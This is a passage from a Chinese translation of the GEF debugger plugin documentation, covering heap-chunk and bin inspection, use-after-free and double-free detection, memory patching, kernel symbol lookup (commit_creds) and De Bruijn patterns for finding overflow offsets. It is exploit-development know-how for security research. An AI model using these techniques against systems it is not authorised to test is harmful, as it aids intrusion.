class="keyword">over</span></span><br></pre></td></tr></table></figure><p>正如您所看到的，如果找不到调试信息，<code>gef</code>将尝试自动下载目标文件并存储在本地临时目录中（在大多数Unix的<code>/tmp</code>上）。 如果成功，它将自动将调试信息加载到<code>gdb</code>并继续调试。</p><p><img src="../../../../../../program/writing/images/gef/h64lqkdzYbXq.png" alt="mark"></p><p>然后，您可以将下载的文件重新用于将来的调试会话，在IDA使用它等。 这使得整个远程调试过程（特别是对于Android应用程序）变得很简单。</p><h3 id="QEMU用户模式"><a href="#QEMU用户模式" class="headerlink" title="QEMU用户模式"></a>QEMU用户模式</h3><p>虽然GDB通过QEMU用户工作，但QEMU仅支持<code>gdbremote</code>协议中存在的所有命令的有限子集。 例如，不支持诸如<code>remote get</code>或<code>remote put</code>（分别从远程目标下载和上载文件）的命令。 因此，<code>gef</code>的默认<code>remote</code>模式也不起作用，因为<code>gef</code>将无法获取远程<code>procfs</code>的内容。</p><p>为了避免这种情况并且仍然享受QEMU用户的<code>gef</code>功能，可以人工添加一个简单的存根，使用<code>geq-remote</code>选项<code>-q</code>选项。 请注意，您需要首先正确设置架构：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-<span class="meta">arm</span> -g <span class="number">1234</span> ./my/<span class="meta">arm</span>/<span class="keyword">binary</span></span><br><span class="line"><span class="keyword">$ </span>gdb-<span class="keyword">multiarch </span>./my/<span class="meta">arm</span>/<span class="keyword">binary</span></span><br><span class="line"><span class="keyword">gef➤ </span> set architecture <span class="meta">arm</span></span><br><span class="line"><span class="symbol">gef</span>➤  gef-remote -q localhost:<span class="number">1234</span></span><br></pre></td></tr></table></figure><p><img src="../../../../../../program/writing/images/gef/Cs1C5IVOF5OC.png" alt="mark"></p><h2 id="heap-命令"><a href="#heap-命令" class="headerlink" title="heap 命令"></a>heap 命令</h2><p><code>heap</code>命令提供有关指定为参数的堆块的信息。 目前，它只支持GlibC堆格式 (参见 <a href="http://code.woboq.org/userspace/glibc/malloc/malloc.c.html#malloc_chunk" target="_blank" rel="noopener">this link</a> 获取<code>malloc</code>结构信息)。子命令的语法很简单：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ heap <span class="tag">&lt;<span class="name">sub_commands</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="heap-chunks-命令"><a href="#heap-chunks-命令" class="headerlink" title="heap chunks 命令"></a><code>heap chunks</code> 命令</h3><p>展示堆段的所有<code>chunks</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ heap chunks</span><br></pre></td></tr></table></figure><p>在某些情况下，分配将从内存页的头立即开始。 如果是，请指定第一个块的基址，如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ heap chunks <span class="tag">&lt;<span class="name">LOCATION</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../../../../../../program/writing/images/gef/6eHfdOMRR4F1.png" alt="mark"></p><h3 id="heap-chunk-命令"><a href="#heap-chunk-命令" class="headerlink" title="heap chunk 命令"></a><code>heap chunk</code> 命令</h3><p>此命令提供Glibc malloc-ed chunked的可视信息。 只需将地址提供给chunk 的用户内存指针，以显示与特定chunk 相关的信息：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ heap chunk <span class="tag">&lt;<span class="name">LOCATION</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../../../../../../program/writing/images/gef/F5pqpSDoeWLP.png" alt="mark"></p><h3 id="heap-arenas-命令"><a href="#heap-arenas-命令" class="headerlink" title="heap arenas 命令"></a><code>heap arenas</code> 命令</h3><p>多线程程序有不同的分配区，而且<code>main_arena</code>的知识还不够。 <code>gef</code>因此提供<code>arena</code>子命令，以帮助您<strong>在调用命令</strong>时列出程序中分配的所有分配区。</p><p><img src="../../../../../../program/writing/images/gef/UsKFmCOSR198.png" alt="mark"></p><h3 id="heap-set-arena-命令"><a href="#heap-set-arena-命令" class="headerlink" title="heap set-arena 命令"></a><code>heap set-arena</code> 命令</h3><p>如果调试符号不存在（例如静态剥离的二进制文件），则可以指示GEF使用以下命令在不同的位置找到<code>main_arena</code>：</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">gef➤</span> <span class="string">heap </span><span class="built_in">set-arena</span> &lt;<span class="string">LOCATION&gt;</span></span><br></pre></td></tr></table></figure><p>如果分配区地址正确，则所有<code>heap</code>命令都将起作用，并使用指定的地址为<code>main_arena</code>。</p><h3 id="heap-bins-命令"><a href="#heap-bins-命令" class="headerlink" title="heap bins 命令"></a><code>heap bins</code> 命令</h3><p>Glibc使用bins来保存已被<code>free</code>的<code>chunk</code>。 这是因为通过<code>sbrk</code>（需要系统调用）进行分配开销很大。 Glibc使用这些bins来记住以前分配的<code>chunk</code>。 因为bin是单链表或双链表，我发现总是查询<code>gdb</code>以获取指针地址，取消引用它，获取值<code>chunk</code>等等是非常痛苦的…所以我决定实现<code>heap bin</code> 子命令，允许获取以下信息：</p><ul><li><p><code>fastbins</code></p></li><li><pre><code>  bins  <figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- `unsorted`</span><br><span class="line">- `small bins`</span><br><span class="line">- `large bins`</span><br><span class="line"></span><br><span class="line">#### `heap bins fast` 命令</span><br><span class="line"></span><br><span class="line">在利用堆损坏漏洞时，有时可以方便地了解`fastbinsY`数组的状态。</span><br><span class="line"></span><br><span class="line">`fast`子命令通过显示此列表中的fastbins列表来帮助实现。 没有任何其他参数，它将显示`main_arena`的信息。 它接受一个可选参数，即另一个arena的地址（您可以使用`heap arenas`轻松找到它）。</span><br></pre></td></tr></table></figure>gef➤ heap bins fast[+] FastbinsY of arena 0x7ffff7dd5b20Fastbin[0] 0x00Fastbin[1]  →  FreeChunk(0x600310)  →  FreeChunk(0x600350)Fastbin[2] 0x00Fastbin[3] 0x00Fastbin[4] 0x00Fastbin[5] 0x00Fastbin[6] 0x00Fastbin[7] 0x00Fastbin[8] 0x00Fastbin[9] 0x00<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 其他的 `heap bins X` 命令</span><br><span class="line"></span><br><span class="line">`heap bins`的所有其他子命令的工作方式与`fast`相同。 如果没有提供参数，`gef`将回退到`main_arena`。 否则，它将使用指向`malloc_state`结构的基址的地址并相应地打印出信息。</span><br><span class="line"></span><br><span class="line">## heap-analysis-helper 命令</span><br><span class="line"></span><br><span class="line">`heap-analysis-helper` 命令旨在通过跟踪和分析内存块的分配和释放来帮助识别Glibc堆不一致的过程。</span><br><span class="line"></span><br><span class="line">目前，可以跟踪以下问题：</span><br><span class="line"></span><br><span class="line">- NULL free</span><br><span class="line">- Use-after-Free</span><br><span class="line">- Double Free</span><br><span class="line">- Heap overlap</span><br><span class="line"></span><br><span class="line">可以通过运行命令简单地激活帮助程序`heap-analysis-helper`。</span><br></pre></td></tr></table></figure>gef➤ heap-analysis[+] Tracking malloc()[+] Tracking free()[+] Disabling hardware watchpoints (this may increase the latency)[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.[+] To disable, clear the malloc/free breakpoints (`delete breakpoints`) and restore hardware breakpoints (`set can-use-hw-watchpoints 1`)<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">帮助程序将创建专门设计的破坏程序以保持分配，从而发现<span class="emphasis">_潜在的_</span>漏洞。一旦激活，只需清除<span class="code">`__GI___libc_free()`</span>和 <span class="code">`__GI___libc_malloc()`</span>即可禁用堆分析断点。也可以通过<span class="code">`gef config`</span>命令启用/禁用手动准时检查。</span><br><span class="line"></span><br><span class="line">允许以下设置:</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span><span class="code">`check_null_free`</span>: 在遇到free(NULL)时中断执行(默认情况下禁用);</span><br><span class="line"><span class="bullet">- </span><span class="code">`check_double_free`</span>: 在遇到double free时中断执行;</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/KQc0DvUfXSAe.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span><span class="code">`check_weird_free`</span>: 针对执行<span class="code">`free()`</span>非跟踪指针调用时 ;</span><br><span class="line"><span class="bullet">- </span><span class="code">`check_uaf`</span>: 在遇到可能的Use-after-Free条件时中断执行。</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/5SjIBzH3Fs9P.png</span>)</span><br><span class="line"></span><br><span class="line">就像格式字符串漏洞助手一样，<span class="code">`heap-analysis-helper`</span> 可能无法检测复杂的堆场景和/或提供一些误报警报。必须手动确定每个发现。</span><br><span class="line"></span><br><span class="line"><span class="code">`heap-analysis-helper`</span>还可以用来简单地跟踪的内存块的分配和释放。可以通过将上述所有配置设置为False来简单地启用跟踪：</span><br></pre></td></tr></table></figure>gef➤  gef config heap-analysis-helper.check_double_free Falsegef➤  gef config heap-analysis-helper.check_free_null Falsegef➤  gef config heap-analysis-helper.check_weird_free Falsegef➤  gef config heap-analysis-helper.check_uaf False<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后，<span class="code">`gef`</span>不会通知您检测到的任何不一致，而只是在分配/释放块时显示清除消息。</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/dTaI196yILj4.png</span>)</span><br><span class="line"></span><br><span class="line">要获取有关当前跟踪的块的信息，请使用<span class="code">`show`</span> 子命令：</span><br></pre></td></tr></table></figure>gef➤  heap-analysis-helper show<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/npjygP5CzXjp.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">## help 命令</span></span><br><span class="line"></span><br><span class="line">显示已加载命令的帮助菜单。</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/MdOdtPeNdFTO.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">## hexdump 命令</span></span><br><span class="line"></span><br><span class="line">模仿WinDBG命令。</span><br><span class="line"></span><br><span class="line">此命令至少需要2个参数，表示数据的格式，以及用作打印hexdump的位置的值/地址/符号。可选的第3个参数用于指定要显示的qword / dword / word / bytes的数量。</span><br><span class="line"></span><br><span class="line">该命令默认提供与WinDBG兼容的别名：</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span><span class="code">`hexdump qword`</span> -&gt; <span class="code">`dq`</span></span><br><span class="line"><span class="bullet">- </span><span class="code">`hexdump dword`</span> -&gt; <span class="code">`dd`</span></span><br><span class="line"><span class="bullet">- </span><span class="code">`hexdump word`</span> -&gt; <span class="code">`dw`</span></span><br><span class="line"><span class="bullet">- </span><span class="code">`hexdump byte`</span> -&gt; <span class="code">`db`</span></span><br><span class="line"></span><br><span class="line">如果字节是可打印的，<span class="code">`hexdump byte`</span>也会尝试显示ASCII字符值（类似于Linux 上的<span class="code">`hexdump -C`</span>命令）。</span><br><span class="line"></span><br><span class="line">语法如下:</span><br></pre></td></tr></table></figure>hexdump (qword|dword|word|byte) LOCATION L[SIZE] [UP|DOWN]<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">例子:</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>显示 4 QWORD 的 <span class="code">`$pc`</span>:</span><br></pre></td></tr></table></figure>gef➤  dq $pc l40x7ffff7a5c1c0+0000 │ 0x48555441554156410x7ffff7a5c1c0+0008 │ 0x0090ec814853cd890x7ffff7a5c1c0+0010 │ 0x377d6f058b4800000x7ffff7a5c1c0+0018 │ 0x748918247c894800<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 显示 <span class="number">32</span> bytes 的堆栈中的某个位置:</span><br></pre></td></tr></table></figure>gef➤  db 0x00007fffffffe5e5 l320x00007fffffffe5e5     2f 68 6f 6d 65 2f 68 75 67 73 79 2f 63 6f 64 65     /home/hugsy/code0x00007fffffffe5f5     2f 67 65 66 2f 74 65 73 74 73 2f 77 69 6e 00 41     /gef/tests/win.A<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## hijack-fd 命令</span><br><span class="line"></span><br><span class="line">`gef`可用于修改已调试进程的文件描述符。新文件描述符可以指向文件，管道，套接字，设备等。</span><br><span class="line"></span><br><span class="line">要使用它，只需运行</span><br></pre></td></tr></table></figure>gef➤ hijack-fd FDNUM NEWFILE<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">例如,</span><br></pre></td></tr></table></figure>gef➤ hijack-fd 1 /dev/null<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">将修改当前进程文件描述符以将STDOUT重定向到 <span class="code">`/dev/null`</span>。</span><br><span class="line"></span><br><span class="line">检查此asciicast以获取可视化示例：![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/Hx5iNNLxDaAG.png</span>)</span><br><span class="line"></span><br><span class="line">此命令还支持连接到ip:port（如果它作为参数提供）。例如</span><br></pre></td></tr></table></figure>gef➤ hijack-fd 0 localhost:8888<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">将STDIN重定向到localhost:8888</span><br><span class="line"></span><br><span class="line">还有一个例子： ![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/U5sDMXuISz4k.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">## ida-interact 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`gef`</span>提供了一个简单的XML-RPC客户端，用于与在特定IDA Python插件中运行的服务器通信<span class="code">`ida_gef.py`</span>（可在[<span class="string">这里</span>](<span class="link">https://raw.githubusercontent.com/hugsy/gef/master/scripts/ida_gef.py</span>)免费下载 ）</span><br><span class="line"></span><br><span class="line">只需下载此脚本，然后在IDA中运行即可。当服务器运行时，您将在“输出”窗口中看到一个文本，例如：</span><br></pre></td></tr></table></figure>[+] Creating new thread for XMLRPC server: Thread-1[+] Starting XMLRPC server: 0.0.0.0:1337[+] Registered 6 functions.<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这表明XML-RPC服务器已准备就绪并正在侦听。</span><br><span class="line"></span><br><span class="line">`gef`可以通过`ida-interact`命令与它进行交互。此命令接收要执行的函数的名称作为第一个参数，所有其他参数是远程函数的参数。</span><br><span class="line"></span><br><span class="line">要枚举可用的功能，只需运行</span><br></pre></td></tr></table></figure>gef➤  ida-interact -h<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/nTOhFfUnaaoN.png</span>)</span><br><span class="line"></span><br><span class="line">现在，要执行RPC，请使用命令<span class="code">`ida-interact`</span>并附加其参数（如果需要）。</span><br><span class="line"></span><br><span class="line">例如：</span><br></pre></td></tr></table></figure>gef➤  ida ida.set_color 0x40061E<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">将编辑远程IDB并设置<span class="number">0x40061E</span>处的背景颜色为<span class="number">0x005500</span>（默认值）。</span><br><span class="line"></span><br><span class="line">另一个方便的例子是直接从`gef`向IDA中添加注释：</span><br></pre></td></tr></table></figure>gef➤  ida ida.add_comment 0x40060C &quot;&lt;&lt;&lt;--- stack overflow&quot;[+] Success<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">结果:</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/Ws2NBBhyGlAR.png</span>)</span><br><span class="line"></span><br><span class="line">请使用–help参数查看所有可用的方法及其语法。</span><br><span class="line"></span><br><span class="line">值得注意的是， [<span class="string">Binary Ninja</span>](<span class="link">https://binary.ninja/</span>) 支持已被添加：</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/aCTqjeTuH1To.png</span>)</span><br><span class="line"></span><br><span class="line">通过使用脚本 [<span class="string">`binja_gef.py`</span>](<span class="link">https://raw.githubusercontent.com/hugsy/gef/master/scripts/binja_gef.py</span>).</span><br><span class="line"></span><br><span class="line"><span class="section">## ksymaddr 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`ksymaddr`</span>有助于按名称查找内核符号。</span><br><span class="line"></span><br><span class="line">语法很简单：</span><br></pre></td></tr></table></figure>ksymaddr &lt;PATTERN&gt;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">例如,</span><br></pre></td></tr></table></figure>gef➤  ksymaddr commit_creds[+] Found matching symbol for &apos;commit_creds&apos; at 0xffffffff8f495740 (type=T)[*] Found partial match for &apos;commit_creds&apos; at 0xffffffff8f495740 (type=T): commit_creds[*] Found partial match for &apos;commit_creds&apos; at 0xffffffff8fc71ee0 (type=R): __ksymtab_commit_creds[*] Found partial match for &apos;commit_creds&apos; at 0xffffffff8fc8d008 (type=r): __kcrctab_commit_creds[*] Found partial match for &apos;commit_creds&apos; at 0xffffffff8fc9bfcd (type=r): __kstrtab_commit_creds<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">## memory 命令</span></span><br><span class="line"></span><br><span class="line">只要在上下文布局中启用了“内存”部分（默认情况下），就可以注册地址，长度和分组大小。</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/Jmb9CMo8NbEx.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">### 添加一个查看</span></span><br></pre></td></tr></table></figure>memory watch &lt;ADDRESS&gt; [SIZE] [(qword|dword|word|byte)]<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 移除一个查看</span><br></pre></td></tr></table></figure>memory unwatch &lt;ADDRESS&gt;<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 列出所有查看</span><br></pre></td></tr></table></figure>memory list<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 清楚所有查看</span><br></pre></td></tr></table></figure>memory clear<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## nop 命令</span><br><span class="line"></span><br><span class="line">`nop`命令允许您轻松跳过指令。</span><br></pre></td></tr></table></figure>gef➤ nop [-b NUM_BYTES] [-h] [LOCATION]<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`LOCATION`表示要绕过的指令的地址。 如果未指定，它将使用程序计数器的当前值。</span><br><span class="line"></span><br><span class="line">如果输入`-b `，gef将显式修补指定的字节数。 否则它会在目标位置修补_whole_指令。</span><br><span class="line"></span><br><span class="line">## patch 命令</span><br><span class="line"></span><br><span class="line">将指定的值修补到指定的地址。</span><br><span class="line"></span><br><span class="line">此命令自动别名为标准的WinDBG命令：`eb`，`ew`，`ed`，`eq`和`ea`。</span><br></pre></td></tr></table></figure>gef➤ patch byte $eip 0x90gef➤ eb 0x8048000 0x41gef➤ ea 0xbffffd74 &quot;This is a double-escaped string\\x00&quot;<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">## pattern 命令</span></span><br><span class="line"></span><br><span class="line">此命令将创建或搜索一个 [<span class="string">De Bruijn</span>](<span class="link">https://en.wikipedia.org/wiki/De_Bruijn_sequence</span>) 循环模式，以便于确定内存中的偏移量。</span><br><span class="line"></span><br><span class="line">应该注意的是，为了更好的兼容性，<span class="code">`GEF`</span>中实现的算法与<span class="code">`pwntools`</span>中的算法相同，因此可以结合使用。</span><br><span class="line"></span><br><span class="line"><span class="section">### 创建</span></span><br><span class="line"></span><br><span class="line">子命令<span class="code">`create`</span>允许创建一个新pattern：</span><br></pre></td></tr></table></figure>gef➤  pattern create 128[+] Generating a pattern of 128 bytesaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab[+] Saved as &apos;$_gef0&apos;<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">该模式可以在以后用作输入。 为了生成这个输入，`GET`考虑了体系结构的大小（<span class="number">16</span>,<span class="number">32</span>或<span class="number">64</span>位），以生成它。</span><br><span class="line"></span><br><span class="line">与`pwntools`的等效命令是</span><br></pre></td></tr></table></figure>from pwn import *p = cyclic(128, n=8)<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">其中`n`是体系结构的字节数（<span class="number">8</span>位为<span class="number">64</span>位，<span class="number">4</span>位为<span class="number">32</span>位）。</span><br><span class="line"></span><br><span class="line">### 查找</span><br><span class="line"></span><br><span class="line">`search`子命令寻找作为参数给出的值，试图在De Bruijn序列中找到它</span><br></pre></td></tr></table></figure>gef➤  pattern search 0x6161616161616167[+] Searching &apos;0x6161616161616167&apos;[+] Found at offset 48 (little-endian search) likely[+] Found at offset 41 (big-endian search)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">请注意，寄存器也可以作为值传递：</span><br></pre></td></tr></table></figure>gef➤  pattern search $rbp[+] Searching &apos;$rbp&apos;[+] Found at offset 32 (little-endian search) likely[+] Found at offset 25 (big-endian search)<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">## pcustom 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`gef`</span> 提供了一种创建任何新结构体(以C结构体方式)和应用于当前调试环境的方法。 除了简单地显示已知和用户定义的结构体之外，它还允许将这些结构体应用于当前上下文。 它打算模仿非常有用的 [<span class="string">WinDBG 中的`dt`命令。</span>](<span class="link">https://msdn.microsoft.com/en-us/library/windows/hardware/ff542772(v=vs.85</span>).aspx)</span><br><span class="line"></span><br><span class="line">这是通过命令<span class="code">`pcustom`</span>（用于<span class="code">`print custom`</span>）实现的，或者你可以使用它的别名<span class="code">`dt`</span>（参考WinDBG命令）。</span><br><span class="line"></span><br><span class="line"><span class="section">### 相关配置</span></span><br><span class="line"></span><br><span class="line">新结构体可以存储在配置给出的位置：</span><br></pre></td></tr></table></figure>gef➤ gef config pcustom.struct_path<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">默认情况下，此位置位于 `$TEMP/gef/structs` (例如 `/tmp/user/<span class="number">1000</span>/gef/structs`).</span><br><span class="line"></span><br><span class="line">可以在一个名为` .py`的文件中创建为一个简单的`ctypes`结构体。</span><br><span class="line"></span><br><span class="line">您可以将此路径设置为新位置</span><br></pre></td></tr></table></figure>gef➤ gef config pcustom.struct_path /my/new/location<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">并保存此更改，以便下次使用`gdb`时可以直接使用它</span><br></pre></td></tr></table></figure>gef➤ gef save[+] Configuration saved to &apos;~/.gef.rc&apos;<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 使用用户定义的结构体</span><br><span class="line"></span><br><span class="line">使用如下命令您可以通过列出现有的自定义结构体</span><br></pre></td></tr></table></figure>gef➤  dt -l[+] Listing custom structures:→  struct5→  struct6<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">要创建或编辑结构体，请使用`dt  -e`以使用目标结构体生成EDITOR。 如果文件不存在，`gef`将创建树和文件，并用`ctypes`模式填充它，你可以立即使用！</span><br></pre></td></tr></table></figure>gef➤  dt mystruct_t -e[+] Creating 